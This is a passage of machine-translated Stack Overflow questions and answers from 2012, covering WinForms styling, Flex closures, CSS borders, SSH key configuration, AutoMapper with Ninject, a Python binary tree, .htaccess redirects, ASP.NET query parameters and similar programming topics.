int f(uint<32> auto) { return 1; }  // still a template
int f(uint<64> auto) { return 2; }  // still a template 
```

# c# - 让 C# 应用程序看起来不错

> ID：11603822
> 
> 赞同：10
> 
> 时间：2012-07-22T20:39:28.767
> 
> 标签：c#, winforms, visual-studio-2010

我最近一直在为我的公司设计许多不需要“花哨”界面的应用程序，并且“基本”控件在外观方面已经足够好。

但是，我刚刚接到一个项目，其中“典型”VS（Visual Studio 2010）外观不会削减它。是否有一些地方可以让我获得“花哨”的 VS 控件，使其看起来不像廉价的构建或基本的 Windows 程序？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-22T20:47:58.073

去学习[**Windows Presentation Foundation**](http://en.wikipedia.org/wiki/Windows_Presentation_Foundation)。它利用 DirectX 并为开发人员提供了一个紧凑的模型，用于为基于 Windows 的系统构建丰富的用户体验。您可以从[本教程网站](http://www.wpftutorial.net/ "这里")开始了解 WPF 是什么以及您可以使用该框架做什么。

还可以查看这些组件以了解 WPF 的强大功能：

*   [DevExpress DX 体验](http://www.devexpress.com/Subscriptions/DXperience/WhatsNew2012v1/wpf.xml)
*   [泰勒里克](http://www.telerik.com/products/wpf/overview.aspx)
*   [组件一](http://www.componentone.com/SuperProducts/StudioWPF/)
*   [同步融合](http://www.syncfusion.com/products/user-interface-edition/wpf)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-22T20:56:34.117

一些选项：

1.  移动到 WPF。

2.  [Telerik](http://www.telerik.com/)、[Devexpress](http://devexpress.com/)、[Infragistics](http://www.infragistics.com/)等提供了更丰富的库，但可能会在你的口袋里留下一个洞。

3.  最低限度，您可以[如何使 .net windows 窗体项目看起来新鲜？](https://stackoverflow.com/questions/33703/how-can-you-make-a-net-windows-forms-project-look-fresh)

# actionscript-3 - Flash 实例变量始终为空？

> ID：11603823
> 
> 赞同：0
> 
> 时间：2012-07-22T20:39:41.447
> 
> 标签：actionscript-3, flash, apache-flex, actionscript, flex4

我正在构建一个 Flex 应用程序，但在检测变量是否已初始化时遇到了问题。观察这个简化的代码示例：

```
<fx:Script>
  <![CDATA[
    private var pageObject:* = null; //Yes the "*" data type is needed ;)

  //Fired by the application elseware
    private function constructMenu(e:ResultEvent):void {
      if (this.pageObject != null) {
        //This block never runs...

        // The pageObject will be null when the application
        // first runs, so skip this first time around.
        // However... this method will be called multiple
        // times. Since FoodMenu() is a display object
        // and is instantiated below, all subsequent calls
        // to this method will require us to remove the old
        // display object before adding a new one.
      } else {
        // This block always runs...
      }

      setTimeout(function():void {
        this.pageObject = new FoodMenu(); //Should now be not-null!!!

        //Do more stuff with the FoodMenu() and add to the main application
      }, 1000);
    }
  ]]>
</fx:Script> 
```

根据给定的代码示例和注释，有人可以解释为什么`this.pageObject`总是注册为非空，不管`constructMenu()`方法被调用多少次或`FoodMenu()`类被实例化多少次？

感谢您的时间。

编辑：按要求提供完整的 MXML

```
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009"
           xmlns:s="library://ns.adobe.com/flex/spark"
           xmlns:mx="library://ns.adobe.com/flex/mx"
           xmlns:components="components.*"
           xmlns:pagesservice="services.pagesservice.*"
           xmlns:menuservice="services.menuservice.*"
           minWidth="955" minHeight="600" backgroundColor="0x141414"
           creationComplete="init(event)" skinClass="skins.Theme" xmlns:pages="components.pages.*" xmlns:reviewsservice="services.reviewsservice.*">
<fx:Script>
    <![CDATA[
        import com.asual.swfaddress.*;
        import com.forwardfour.boncuisson.events.MenuEvent;
        import com.greensock.TweenMax;
        import com.greensock.plugins.VisiblePlugin;

        import components.header.Menu;
        import components.pages.FoodMenu;

        import flash.utils.setTimeout;

        import mx.controls.Alert;
        import mx.core.IVisualElement;
        import mx.events.FlexEvent;
        import mx.rpc.events.FaultEvent;
        import mx.rpc.events.ResultEvent;

        import skins.Theme;

        import spark.components.Group;

    //Globalize a reference to the navigation menu
        private var menu:Menu;

    //Globalize a reference to the page content
        private var pageObject:* = null; //This reference will be various types, so just make a general object

    /**
     * Initialization
     * -------------------------------
    */

    //Add an event listener for when "links" on the menu are clicked and initialize SWFAddress
        private function init(event:FlexEvent):void {
        //Listen for menu clicks
            var skin:Theme = Theme(this.skin);
            this.menu = Menu(skin.menu);
            this.menu.addEventListener(Menu.MENU_ITEM_CLICKED, menuNavigateToPageHandler);

        //Initialize SWFAddress
            SWFAddress.addEventListener(SWFAddressEvent.INIT, initSWFAddress);
        }

    //Initialize SWFAddress and grab the page listed from the URL
        private function initSWFAddress(e:SWFAddressEvent):void {
        //Listen for change events
            SWFAddress.addEventListener(SWFAddressEvent.CHANGE, URLNavigateToPageHandler);

        //Fetch the page from the URL
            var URL:String = SWFAddress.getValue();

            if (URL == "" || URL == "/") {
                pagesResponder.token = page.getPagesByPosition(1);
            } else {
                pagesResponder.token = page.getPagesByURL(URL.substring(1));
            }
        }

    /**
     * Navigation handlers
     * -------------------------------
    */

    //Go to a specific page when a menu item has been clicked
        private function menuNavigateToPageHandler(e:MenuEvent):void {
            SWFAddress.setValue(e.pageURL);
            pagesResponder.token = page.getPagesByID(e.pageID);
        }

    //Request a page when the URL has changed
        private function URLNavigateToPageHandler(e:SWFAddressEvent):void {
            var URL:String = SWFAddress.getValue();

            if (URL == "" || URL == "/") {
                pagesResponder.token = page.getPagesByPosition(1);
            } else {
                pagesResponder.token = page.getPagesByURL(URL.substring(1));
            }
        }   

    /**
     * Loading content
     * -------------------------------
    */  

    //Show an error dialog in the case of an error when communicating with the server
        private function requestErrorHandler(e:FaultEvent):void {
            Alert.show("Fault string: " + e.fault.faultString + "\nFault detail: " + e.fault.faultDetail, e.fault.faultCode);
        }   

    //Determine what kind of page will be constructed
        private function determinePage(e:ResultEvent):void {
            var pageType:String = pagesResponder.lastResult.type;

        //We will need to know the type of page to build
            switch(pageType) {
                case "menu" : 
                    menuResponder.token = menuFetch.getMenuByType(pagesResponder.lastResult.category);
                    break;

                case "lunch" : 
                    break;

                case "reviews" : 
                    reviewsResponder.token = reviews.getAllReviews();
                    break;

                case "home" : 
                default : 
                    break;
            }
        }

    //Using the data that was fetched from the "menuFetch" service, construct the page of type menu
        private function constructMenu(e:ResultEvent):void {
        //Transition the existing page out of view
            if (this.pageObject != null) {
                Alert.show("i");
                TweenMax.to(this.pageObject, 0.75, {
                    alpha : 0,
                    y : 20
                });

                removeElement(this.pageObject);
            }

            setTimeout(function():void {
                this.pageObject = new FoodMenu();
                this.pageObject.alpha = 0;
                this.pageObject.y = 20;
                this.pageObject.data = menuResponder.lastResult;
                addElement(this.pageObject);

            //Tween the new menu into place
                TweenMax.to(this.pageObject, 0.75, {
                    alpha : 1,
                    y : 0
                });
            }, 1000);
        }
    ]]>
</fx:Script>

<!-- Make a request to the server for the page data -->
<fx:Declarations>
    <pagesservice:PagesService id="page"/>
    <s:CallResponder id="pagesResponder" fault="requestErrorHandler(event)" result="determinePage(event)"/>

    <menuservice:MenuService id="menuFetch"/>
    <s:CallResponder id="menuResponder" fault="requestErrorHandler(event)" result="constructMenu(event)"/>

    <reviewsservice:ReviewsService id="reviews"/>
    <s:CallResponder id="reviewsResponder" fault="requestErrorHandler(event)" result="constructMenu(event)"/>
</fx:Declarations>
</s:Application> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T21:00:47.130

我看到的一个可能的问题是这段代码：

```
setTimeout(function():void {
   this.pageObject = new FoodMenu(); //Should now be not-null!!!
   //Do more stuff with the FoodMenu() and add to the main application
}, 1000); 
```

“this”指针指向闭包中的其他东西（可能是全局对象）。

尝试以下方法来亲自查看：

```
trace(this);
setTimeout(function():void {
    trace(this);
},1000); 
```

# html - 顶部栏 div 上的边框在高缩放时中断（in）< 20 行代码 | 简单的

> ID：11603824
> 
> 赞同：1
> 
> 时间：2012-07-22T20:39:42.010
> 
> 标签：html, css

我在 Firefox 中工作...不确定它是否依赖于浏览器。

Olof 也刚刚在 Chrome 中进行了验证。

我试图让我的 CSS 完美地显示像素。我也放大看看。我遇到了一个问题，即我在顶部栏上的边框在高缩放时消失了。不太清楚为什么会发生这种情况或我能做些什么来解决它。

这是小提琴：

[http://jsfiddle.net/DsNr2/](http://jsfiddle.net/DsNr2/)

这是小提琴的屏幕截图

![在此处输入图像描述](../Images/cea5f3cbb7dce9c820568603c465253a.png)

请注意，您必须放大才能看到边框消失。

我希望看到从屏幕一侧到另一侧的边框，但在您放大时会停在两者之间。

我不太关心需要放大的用户（在 Firefox 上使用 Control +），但更关心我自己的开发需求并验证一切都已到位。

顶部栏元素已在小提琴中删除，以缩小到导致代理的范围。

这是小提琴的代码

```
<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
MODULE - NORMALIZE/ALL
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->

<style>
body{
  padding:  0px;
  margin:  0px;
  background:  #bfddec;
  line-height: 100%;
}

#A{
  background:  -moz-linear-gradient(top, #009fd0, #008db8);
  background:  -webkit-linear-gradient(top, #009fd0, #008db8);
  border-bottom:  1px solid #007fa5;
}
#Aa{
  position:  relative;
  width:  1000px;
  height:  40px;
  margin-left:  auto;
  margin-right:  auto;
  background:  -moz-linear-gradient(top, #009fd0, #008db8);
  background:  -webkit-linear-gradient(top, #009fd0, #008db8);
}

</style>

<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
MODULE - HEADER
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->

<div id='A'>
  <div id='Aa'>
  </div>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:56:52.063

div`#A`底部有一个 1px 的边框；div`#Aa`没有。 `#Aa`被渲染为比 宽，因此停止`#A`底部的 1px 边框。`#A`

由于`#Aa`跨越整个屏幕顶部，您可以将边框应用于`#Aa`：

[http://jsfiddle.net/DsNr2/9/](http://jsfiddle.net/DsNr2/9/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T21:05:01.270

margin-left: auto 和 margin-right: auto （可以压缩为 margin: 0 auto;）

似乎暗示您希望内部 div 居中。如果没有父 div 的宽度，这不会发生。

也许这就是你想要的？

```
#A{
  width: 100%;
}
#Aa{
  position:  relative;
  width:  1000px;
  height:  40px;
  margin-left:  auto;
  margin-right:  auto;
  background:  -moz-linear-gradient(top, #009fd0, #008db8);
  background:  -webkit-linear-gradient(top, #009fd0, #008db8);
  border-bottom:  1px solid #007fa5;
} 
```

# ssh - 如何使用私钥 ssh 两个深度？

> ID：11603825
> 
> 赞同：-1
> 
> 时间：2012-07-22T20:39:48.193
> 
> 标签：ssh

在工作中，我可以通过在我的工作机器上设置的私钥通过 ssh 连接到服务器。

```
jake@work$ ssh server
jake@server$ 
```

我正在尝试使用私钥从家里 ssh 到服务器。该过程应如下所示：

```
jake@home$ ssh work
jake@work$ ssh server
jake@server$ 
```

但相反，它要求我输入密码。如果我用 -v 调用 ssh 服务器，它表明它正在寻找密钥 .ssh/id_dsa 和 .ssh/id_rsa，但我的密钥名称不同。

我可以通过自己指定密钥来进入服务器：

```
jake@home$ ssh work
jake@work$ ssh server -i .ssh/idfoo
jake@server$ 
```

如何让 ssh 为这两个步骤登录过程找到正确的密钥？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:54:33.243

您可以在 ~/.ssh/config 上使用 Host+IdentityFile 指定密钥`work`：

```
Host server
    IdentityFile idFoo 
```

或者只是在配置文件中单独使用这个，将密钥标识应用于所有会话：

```
IdentityFile idFoo 
```

但我无法解释为什么只有在尝试从`work`->`server`从`work`ssh 会话 ssh 时才需要这样做。

# shell - 如何在 Cygwin shell 出口处运行脚本？

> ID：11603830
> 
> 赞同：0
> 
> 时间：2012-07-22T20:40:23.047
> 
> 标签：shell, command, cygwin, exit

在 Cygwin 中，我的 .bash_profile 如下所示：

```
nohup mintty &
exit
```

mintty 命令启动并使用 .bashrc处理我所有*真正的启动内容。*我想做的是`ssh-agent`在我退出 mintty 时杀死所有进程。有没有办法让我自动做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:49:29.613

这可能会有所帮助：[http ://en.wikipedia.org/wiki/Nohup#Overcoming_hanging](http://en.wikipedia.org/wiki/Nohup#Overcoming_hanging)

（有趣的问题，我希望 shell 自动存在并让你的进程运行直到完成）

# ninject - Ninject 和 AutoMapper

> ID：11603831
> 
> 赞同：1
> 
> 时间：2012-07-22T20:40:33.103
> 
> 标签：ninject, silverlight-5.0, automapper-2

我正在为一个内部演示拼凑一些代码，该演示由基于 Caliburn.Micro 构建的 Silverlight 5.0 UI 组成。

**摘要场景：** 我试图让 AutoMapper 映射来自服务代理类的视图模型列表。视图模型具有 ctor 依赖关系，所以我想使用 Ninject 来解决这个问题。

**详细信息：** 我有一个调用服务的父视图模型 (AvailableItemsViewModel)。然后，它使用 AutoMapper 将返回的 DTO 列表映射到 AvailableItemViewModel。

AvailableItemViewModel 引用了 Caliburn 的 IEventAggregator - 因为视图模型将根据用户输入发布事件。

我读了：

[使用 Ninject 注入 AutoMapper 依赖项](https://stackoverflow.com/questions/3615095/injecting-automapper-dependencies-using-ninject)

[带有 Ninject 混淆的 AutoMapper](https://stackoverflow.com/questions/10938740/automapper-with-ninject-confusion)

[如何配置 Automapper 以注入 Ninject 2.0？](https://stackoverflow.com/questions/3401303/how-to-configure-automapper-to-be-injected-with-ninject-2-0)

所有这些看起来都非常相似......所以我在我的 Bootstrap 类中得到了以下内容：

```
 public class AutoMapperModule : NinjectModule
    {
        public override void Load()
        {
            Bind<ITypeMapFactory>().To<TypeMapFactory>();

            foreach (var mapper in MapperRegistry.AllMappers())
                Bind<IObjectMapper>().ToConstant(mapper);

            Bind<ConfigurationStore>().ToSelf().InSingletonScope().WithConstructorArgument("mappers", ctx => ctx.Kernel.GetAll<IObjectMapper>());
            Bind<IConfiguration>().ToMethod(ctx => ctx.Kernel.Get<ConfigurationStore>());
            Bind<IConfigurationProvider>().ToMethod(ctx => ctx.Kernel.Get<ConfigurationStore>());
            Bind<IMappingEngine>().To<MappingEngine>();

            Mapper.Initialize(cfg =>
            {
                cfg.ConstructServicesUsing(t=>Kernel.Get(t));                
            });

        }
    } 
```

如果我在引导程序中设置断点，我会看到 Ninject 可以成功创建 AvailableItemViewModel 的实例。

错误是：

{System.ArgumentException：类型“Caliburn.Proto.ViewModels.AvailableItemViewModel”在 AutoMapper.DelegateFactory 的 System.Linq.Expressions.Expression.New(Type type) 处没有默认构造函数。<>c__DisplayClass1.b__0(Type t) at TvdP.Collections.ConcurrentDictionary`2.GetOrAdd(TKey key, Func`2 valueFactory) 在 AutoMapper.DelegateFactory.CreateCtor(Type type) 在 AutoMapper.Mappers.ObjectCreator.CreateObject(Type type) 在 AutoMapper.MappingEngine.AutoMapper.IMappingEngineRunner.CreateObject(ResolutionContext context) 在 AutoMapper.Mappers.TypeMapObjectMapperRegistry.NewObjectPropertyMappingStrategy.GetMappedObject( ResolutionContext context, IMappingEngineRunner mapper) at AutoMapper.Mappers.TypeMapObjectMapperRegistry.PropertyMappingStrategy.Map(ResolutionContext context, IMappingEngineRunner mapper) at AutoMapper.Mappers.TypeMapper.Map(ResolutionContext context, IMappingEngineRunner mapper) at AutoMapper.MappingEngine.AutoMapper.IMappingEngineRunner.Map(ResolutionContext语境）}

所以 Ninject 没有被使用？

进行映射的代码是：

```
var availItems = Mapper.Map<List<Item>, List<AvailableItemViewModel>>(shoppingListStore.GetAvailableItems().ToList());

AvailableItems = new ObservableCollection<AvailableItemViewModel>(availItems); 
```

我错过了什么？

（AutoMapper 是 2.1.267.0，Ninject 是 3.0.0.0。我也在使用 Ninject.Conventions）

**[更新]** 我注意到[AutoMapper with Ninject](https://stackoverflow.com/questions/10559026/automapper-with-ninject?rq=1)帖子中的“解决方法”也适用于我。

**[更新]** 鉴于此： Mapper.CreateMap().ConstructUsingServiceLocator();

如果我删除 ConstructUsingServiceLocator() 方法，那么 Kernel.Get 上的断点：

```
cfg.ConstructServicesUsing(t=>Kernel.Get(t)); 
```

不触发。所以看起来两者都是必需的？

# javascript - 如何使用javascript提取url的数字部分

> ID：11603843
> 
> 赞同：-3
> 
> 时间：2012-07-22T20:43:28.943
> 
> 标签：javascript

我想使用 javascript 来提取 url 的数字部分。只应该有一组数字（又名 - 它永远不会是 www.example.com/455/all/6）。这组数字并不总是相同的。我怎样才能做到这一点？我知道我可以使用此代码

```
 var urlPath = window.location.pathname; 
```

提取网址，但我不知道如何更进一步。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-22T20:46:45.420

`urlPath.match(/\d+/)[0]`会得到数字。但是，它不执行任何健全性检查，如果根本没有数字，它将失败。为了获得更好的结果，请尝试：

```
var t = urlPath.match(/\d+/);
t = t ? t[0] : null; // or some other default value, such as `0` 
```

# python - 从python中的二进制序列创建二叉树

> ID：11603845
> 
> 赞同：1
> 
> 时间：2012-07-22T20:43:47.453
> 
> 标签：python, tree, binary-tree

我正在尝试从像“100101”这样的二进制序列二进制创建一棵树，然后我希望像这样创建树。（基本上1表示向右，0表示向左）

```
 <Root node>
                                    |
                                    1
                                   /
                                  0
                                 /
                                0
                                 \
                                  1
                                 /
                                0
                                 \
                                  1 
```

所以我在这里做的是代码：其中值将是字符串序列（例如值=“1001”）

```
def _inserto(root,value):
    for i in value:
        if root == None:
            root = BSTNode(i)
            current = root
        elif i == "1":
            if current.right is not None:
                current.right = BSTNode(i)
                current = current.right
            else:
                current.right = BSTNode(i)
                current = current.right
        elif i == "0":
            if (current.left is not None):
                current.left = BSTNode(i)
                current = current.left
            else:
                current.left =BSTNode(i)
                current = current.left
    return root 
```

现在的问题是，如果我想输入另一个像“01”这样的序列，树应该是这样的

```
 <Root Node>
                                |
                                1
                               /
                              0
                             / \
                            0   1
                             \
                              1
                             /
                            0
                             \
                              1 
```

，但我真的很难过，因为我的函数将覆盖旧树。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T23:17:28.250

问题在于处理现有节点的代码。如果存在，代码会用新的 BSTNode 覆盖它，从而丢失其下的所有现有节点。你需要的是这样的：

```
 elif i == "1":
        if current.right is None:
            current.right = BSTNode(i)
        current = current.right
    elif i == "0":
        if root.left is None:
            current.left = BSTNode(i)
        current = current.left 
```

这只会在没有节点存在的情况下分配一个节点，然后将 current 设置为这个新节点。

# utf-8 - iText PDF Exporter UTF-8 字符编码错误

> ID：11603847
> 
> 赞同：2
> 
> 时间：2012-07-22T20:43:52.787
> 
> 标签：utf-8, itext, itextpdf

尽管我将导出器的**CHARACTER_ENCODING**属性设置为**UTF-8**，但我在使用 iText PDF 库导出 PDF 时遇到了字符编码问题，如下所示：

```
Class clazz = Class.forName(User.class);
Document document = new Document();
PdfWriter.getInstance(document, baos);
document.open();
addMetaData(document);
addDate(document);
addTitlePage(document, className);
addEmptyLineToDocument(document, 2);
addContent(document, className, clazz);
addEmptyLineToDocument(document, 2);
addSignature(document);
return document; 
```

这是**addContent**方法示例：

```
private static FontFamily fontFamily = FontFamily.TIMES_ROMAN;
Font fontNormal10 = new Font(fontFamily, 10, Font.NORMAL);
Paragraph paragraph = new Paragraph();
Chunk chunk = new Chunk("Here is the list of " + className, fontNormal10);
paragraph.add(chunk);
// continues 
```

然后我用 ServletOutputStream 编写文档：

```
// **document** => which I created and returned above
document.close();
response.setHeader("Expires", "0");
response.setHeader("Cache-Control", "must-revalidate, post-check=0, pre-check=0");
response.setHeader("Pragma", "public");
response.setHeader("Content-Disposition", "attachment; filename=" + outputFileName);
response.setContentType("application/pdf; charset=UTF-8");
response.setContentLength(baos.size());
ServletOutputStream outputStream = response.getOutputStream();
baos.writeTo(outputStream); 
outputStream.flush();
outputStream.close(); 
```

*   我还添加了 JVM 参数“ **file.encoding=UTF-8** ”。
*   **使用“ charset=UTF-8;** ”属性设置响应内容类型。

有任何想法吗？提前致谢..

# apache - 301将子域重定向到同一目录中的文件（htaccess）

> ID：11603851
> 
> 赞同：1
> 
> 时间：2012-07-22T20:45:58.700
> 
> 标签：apache, .htaccess

在根文件夹中，我有：

```
/
  users.php
  admin.php
  index.php 
```

我有子域设置

```
users.foo.com
admin.foo.com
foo.com 
```

我试着设置一个 301，所以如果有人去 users.foo.com/admin.php 它将重定向到 users.foo.com 而不是呈现 admin.php 文件

```
Redirect 301 users.foo.com/admin.php users.foo.com  #<-- this doesnt work 
```

如果没有“索引”文件都在同一个文件夹中，这可能吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T02:50:21.647

您不能将主机信息放在`Redirect`指令中，但可以使用 mod_rewrite ：

```
RewriteCond %{HTTP_HOST} ^users.foo.com$
RewriteRule ^admin\.php$ / [R=301,L] 
```

# eclipse - eclipse外的JUnit测试

> ID：11603854
> 
> 赞同：0
> 
> 时间：2012-07-22T20:46:07.620
> 
> 标签：eclipse, command-line, junit, java

> **可能重复：**
> [CLI 中的 JUnit 测试等效项](https://stackoverflow.com/questions/7346693/junit-test-equivalent-in-cli)

我在eclipse中创建了一个java项目。我可以右键单击并将项目导出到可执行 jar 文件，以便可以使用 JRE 工具从命令行运行它。

对于同一个项目，我也有 Junit 测试。具体来说，我使用的是 JUnit 版本 4。如何像在 eclipse 中一样从命令行运行 JUnit 测试（右键单击项目--> 运行方式--> JUnit 测试）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:08:46.103

最好使用一些项目管理工具，例如 Maven 或 Ant（对于小型项目）。这样，您将获得独立于 IDE 的项目，该项目能够在您选择的 IDE 之外构建和运行测试。

# scala - 在 scalaz 中构造他的每个节点的 TreeLoc 树

> ID：11603856
> 
> 赞同：2
> 
> 时间：2012-07-22T20:46:37.153
> 
> 标签：scala, tree, functional-programming, scalaz

*TreeLoc 是树的拉链*

我在存储在树中的游戏中有一个历史动作（以便在保存中存储不同的最终状态）。所以基本上`TreeLoc[Action]`我的游戏中有一个（知道哪个节点是当前的最终状态）。

所以现在我希望我的用户能够进入这个历史。所以我想要向他展示他的动作树，当他点击一个节点时，我计算并用同一根树的 TreeLoc 替换我的历史记录，但重点放在正确的节点上。为每个节点创建每个 TreeLoc 关联是没有用的，所以我认为找到一种方法来转换我的`Tree[Action]`（这是当前`TreeLoc[Action].toTree)`的）将是一个很好的解决方案，我`Tree[(Action, () => TreeLoc[Action])].`怎么能做这样的事情？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T21:29:21.153

我可能没有正确理解，所以如果没有，请纠正我。

您有一个呈现给用户的 Tree[Action]，当用户选择该树中的一个节点时，您想要一个专注于所选节点的 TreeLoc？是对的吗？

像这样的东西？

```
val tree : Tree[Action] = // build your tree

def select(userSelected: Action) : Option[TreeLoc[Action]] = {
    tree.loc.find(_.getLabel == userSelected)
} 
```

返回的 TreeLoc 将集中在匹配但植根于同一棵树的节点上。

显然 find() 可能不是您想要的，唯一的 id 可能比相等测试更好。

# xcode - 在 xcode 中执行代码后切换情节提要中的视图

> ID：11603861
> 
> 赞同：0
> 
> 时间：2012-07-22T20:47:02.627
> 
> 标签：xcode, button, view, storyboard, switch-statement

我制作了一个登录屏幕，一旦您按下按钮登录，它就会验证用户名和密码。我想要做的是在身份验证完成后切换到不同的视图。我正在为此应用程序使用情节提要，并且我已经对其进行了设置，以便登录按钮执行模态序列，但它不会切换视图。我用一个示例按钮对此进行了测试，它所做的一切都是将视图切换回相同的视图并刷新视图。为了让我的功能从我的 ViewController 视图（主视图）切换到下一个视图（RootViewController），我需要添加什么。我有一个 navigationController 和一个从 ViewController 类创建的对象，但我不知道如何使用它们来切换视图。

谁能指出我正确的方向？如果需要，我可以提供更多信息或示例代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T15:07:31.213

如果我正确地关注了您的问题，那么您正在寻找的是[performSegueWithIdentifier:sender:](http://developer.apple.com/library/ios/documentation/uikit/reference/UIViewController_Class/Reference/Reference.html#//apple_ref/occ/instm/UIViewController/performSegueWithIdentifier%3asender%3a)。

一般来说，[关于故事板中视图控制器的苹果文档](http://developer.apple.com/library/ios/#featuredarticles/ViewControllerPGforiPhoneOS/UsingViewControllersinYourApplication/UsingViewControllersinYourApplication.html)非常好，涵盖了故事板中视图之间转换的所有相关位。

# asp.net - QueryStringField：未指定值时

> ID：11603863
> 
> 赞同：0
> 
> 时间：2012-07-22T20:47:25.827
> 
> 标签：asp.net

我正在使用查询字符串来传递一个值，该值用于在第二页上选择订阅类别（变量名*subno ）。*

基于订阅类别（*subno*在 sql server 中指定为整数，作为表类别的一部分），使用以下 URL 调用第二页 -

```
http://localhost:53175/v1/ProductsList.aspx?subno=1
or
http://localhost:53175/v1/ProductsList.aspx?subno=2 
```

在第二页 中， *subno* 用于根据传递的*subno*查询项目。

```
<asp:SqlDataSource ID="subscription" runat="server"  
        ConnectionString="<%$ ConnectionStrings:aimnbde3ConnectionString %>" 

        SelectCommand="SELECT [subscription] FROM [subscription] WHERE ([subno] = @subno)">
    <SelectParameters>
        <asp:QueryStringParameter Name="subno" QueryStringField="subno" Type="Int32" />
    </SelectParameters>
</asp:SqlDataSource> 
```

如果通过了 category(varibale subno)，则此代码运行良好。如果第二页被直接调用

```
http://localhost:53175/v1/ProductsList.aspx 
```

然后 subno 的值被解释为 0。我们是否有办法根据 subno 的值更改查询（SelectCommand="SELECT [subscription] FROM [subscription] ）？

或者请提出正确的方法来处理subno没有通过的情况

编辑——

很抱歉错过了问题的重要部分-

什么时候 `http://localhost:53175/v1/ProductsList.aspx` 访问我想显示所有产品，所以查询将是

```
SELECT [subscription] FROM [subscription] 
```

如果传递了一个值，查询将是

```
SELECT [subscription] FROM [subscription] WHERE ([subno] = @subno) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T20:59:02.807

我会将查询更改为：

```
SELECT [subscription] FROM [subscription] WHERE (@subno is null or [subno] = @subno) 
```

然后将以下内容添加到参数中

```
ConvertEmptyStringToNull = "TRUE" 
```

以及以下到 SQLDataSource

```
CancelSelectOnNullParameter = "FALSE" 
```

所以你的代码看起来像这样：

```
<asp:SqlDataSource ID="subscription" runat="server" CancelSelectOnNullParameter="false" 
        ConnectionString="<%$ ConnectionStrings:aimnbde3ConnectionString %>" 

        SelectCommand="SELECT [subscription] FROM [subscription] WHERE (@subno is null or [subno] = @subno)">
    <SelectParameters>
        <asp:QueryStringParameter Name="subno" QueryStringField="subno" Type="Int32" ConvertEmptyStringToNull = "true"/>
    </SelectParameters>
</asp:SqlDataSource> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-22T20:56:07.100

您可以简单地将 SQL 查询的 where 部分更改为：

```
WHERE (@subno = 0 OR [subno] = @subno) 
```

# php - 通配符数组比较——提高效率

> ID：11603865
> 
> 赞同：2
> 
> 时间：2012-07-22T20:47:27.613
> 
> 标签：php, loops, foreach, while-loop, preg-match

我有两个要比较的数组，我想知道是否有更有效的方法来做到这一点。

第一个数组是用户提交的值，第二个数组是允许的值，其中一些可能包含通配符来代替数字，例如

```
// user submitted values
$values = array('fruit' => array(
        'apple8756apple333',
        'banana234banana',
        'apple4apple333',
        'kiwi435kiwi'
        ));

//allowed values
$match = array('allowed' => array(
        'apple*apple333',
        'banana234banana',
        'kiwi*kiwi'
        )); 
```

我需要知道第一个数组中的所有值是否与第二个数组中的值匹配。

这就是我正在使用的：

```
// the number of values to validate
$valueCount = count($values['fruit']);

// the number of allowed to compare against
$matchCount = count($match['allowed']);

// the number of values passed validation
$passed = 0;

// update allowed wildcards to regular expression for preg_match
foreach($match['allowed'] as &$allowed)
{
    $allowed = str_replace(array('*'), array('([0-9]+)'), $allowed);
}

// for each value match against allowed values
foreach($values['fruit'] as $fruit)
{
    $i = 0;
    $status = false;
    while($i < $matchCount && $status == false)
    {
        $result = preg_match('/' . $match['allowed'][$i] . '/', $fruit);
        if ($result)
        {
            $status = true;
            $passed++;
        }
        $i++;
    }
}

// check all passed validation
if($passed === $valueCount)
{
    echo 'hurray!';
}
else
{
    echo 'fail';
} 
```

我觉得我可能会错过一个比 foreach 循环中的 while 循环做得更好的 PHP 函数。还是我错了？

**更新：**对不起，我忘了提，数字可能出现在值中超过 1 个位置，但只有 1 个通配符。我已经更新了数组来表示这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T21:43:52.330

如果您不想在另一个循环中使用循环，那么将您的`$match`正则表达式分组会更好。

您可以使用更少的代码获得整个功能，这可能比您当前的解决方案更有效：

```
// user submitted values
$values = array(
          'fruit' => array(
              'apple8756apple',
              'banana234banana',
              'apple4apple',
              'kiwi51kiwi'
            )
          );

$match = array(
           'allowed' => array(
              'apple*apple',
              'banana234banana',
              'kiwi*kiwi'
            )
          );

$allowed = '('.implode(')|(',$match['allowed']).')';
$allowed = str_replace(array('*'), array('[0-9]+'), $allowed);

foreach($values['fruit'] as $fruit){
  if(preg_match('#'.$allowed.'#',$fruit))
    $matched[] = $fruit;
}

print_r($matched); 
```

见这里：[http ://codepad.viper-7.com/8fpThQ](http://codepad.viper-7.com/8fpThQ)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:59:39.847

尝试用'*'替换第一个数组中的/\d+/，然后在两个数组之间执行array_diff()

编辑：澄清后，这里有一个更精致的方法：

```
<?php
    $allowed = str_replace("*", "\d+", $match['allowed']);
    $passed = 0;
    foreach ($values['fruit'] as $fruit) {
        $count = 0;
        preg_replace($allowed, "", $fruit, -1, $count);    //preg_replace accepts an array as 1st argument and stores the replaces done on $count;
        if ($count) $passed++;
    }
    if ($passed == sizeof($values['fruit']) {
        echo 'hurray!';
    } else {
        echo 'fail';
    }
?> 
```

上面的解决方案并没有消除对嵌套循环的需求，但它只是让 PHP 执行内部循环，这*可能*会更快（您实际上应该对其进行基准测试）

# macos - 核心数据会是一个不错的选择吗？

